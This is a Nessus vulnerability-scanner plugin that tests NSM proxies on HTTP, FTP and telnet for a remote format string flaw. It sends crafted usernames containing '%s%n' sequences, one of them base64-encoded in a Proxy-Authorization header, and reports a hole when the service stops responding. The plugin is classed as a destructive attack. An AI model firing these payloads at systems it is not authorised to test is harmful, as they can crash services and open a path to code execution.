#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
	script_id(10540);
	script_version ("$Revision: 1.21 $");
	script_xref(name:"OSVDB", value:"439");

	script_name(english:"NSM Multiple Service Remote Format String");
	script_summary(english:"Determines if NSM is vulnerable to format strings attacks");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote host is vulnerable to an access control breach.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote proxy is vulnerable to format strings attacks
when issued a badly formed user name.

This flaw allows an attacker to execute arbitrary code on this
host."
  );

  script_set_attribute(
    attribute:'solution',
    value: "If you are using NSM, please contact your vendor for a patch."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://www.solsoft.org/nsm/news/972559672/index_html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

 	script_category(ACT_DESTRUCTIVE_ATTACK);
	script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
	script_family(english:"Gain a shell remotely");
	script_require_ports(21,23,80);
	script_dependencie("smtp_settings.nasl");
	exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("ftp_func.inc");
include("telnet_func.inc");

if (report_paranoia < 2) exit(0);

#
# This script attempts to reproduce the described problem via
# telnet, ftp and http. I did not write three scripts because all these
# flaws are the same in the end.
#

#
# No service detection is performed here, because nsm respects
# the ports (21,23 and 80).
#

#
#
# First, try HTTP
#


port = 80;
if(get_port_state(port) && ! get_kb_item("Services/www/" + port + "/broken") )
{
 soc = http_open_socket(port);
 if(soc)
 {
  #
  # We first log in as 'nessus:nessus'
  #
  domain = get_kb_item("Settings/third_party_domain");
  req = string("GET http://www.", domain, " HTTP/1.0\r\n",
  	 	"Proxy-Authorization: Basic bmVzc3VzOm5lc3N1cwo=\r\n\r\n");
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(r)
  {
   soc = http_open_socket(port);
   if ( soc )
   {
   #
   # Then we log in as 'nessus%s%s%s%s%s%s:pass'
   #
   req = string("GET http://www.", domain, " HTTP/1.0\r\n",
   		"Proxy-Authorization: Basic bmVzc3VzJXMlcyVzJXMlcyVzOnBhc3MK\r\n\r\n");
   send(socket:soc, data:req);
   r ='';
   for (i = 0; i < 3 && ! r; i ++)
     r = http_recv(socket:soc);
   http_close_socket(soc);
   if(!r) security_hole(port);
   }
  }
 }
}


#
# Then, try FTP
#
port = 21;
if(get_port_state(port))
{
soc = open_sock_tcp(port);
if(soc)
{
  b = recv_line(socket:soc, length:4096);
  if("proxy" >< b)
   {
   req = string("USER nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
    {
     soc = open_sock_tcp(port);
     if ( soc )
     {
     r = recv_line(socket:soc, length:4096);
     req = string("USER %s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r = ftp_recv_line(socket:soc, retry: 3);
     close(soc);
     if(!r){
     	security_hole(port);
	exit(0);
     }
    }
   }
  }
 }
}

#
# Then try telnet
#
port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 b = telnet_negotiate(socket:soc);
 b = string(b,recv(socket:soc, length:2048, timeout:2));
 if("proxy" >< b)
 {
   req = string("nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
   {
     soc = open_sock_tcp(port);
     if ( soc )
     {
     req = string("nessus%s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r ='';
     for (i = 0; i < 3 && ! r; i ++)
        r = recv_line(socket:soc, length:1024);
     close(soc);
     if(!r)security_hole(port);
     }
   }
  }
 }
}
